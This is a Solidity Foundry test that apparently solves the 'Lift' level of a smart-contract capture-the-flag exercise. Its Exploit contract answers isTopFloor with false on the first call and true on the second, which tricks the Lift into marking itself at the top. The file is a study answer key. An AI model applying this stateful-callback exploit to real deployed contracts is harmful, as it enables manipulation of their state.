// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        Exploit exploit = new Exploit(address(instance));

        exploit.attack();


    checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}

contract Exploit is House {
    Lift public lift;
    bool public firstCall = true;

    constructor(address _liftAddress) {
        lift = Lift(_liftAddress);
    }

    function isTopFloor(uint256 ) external override returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }

    function attack() public {
        lift.goToFloor(1);
    }
}
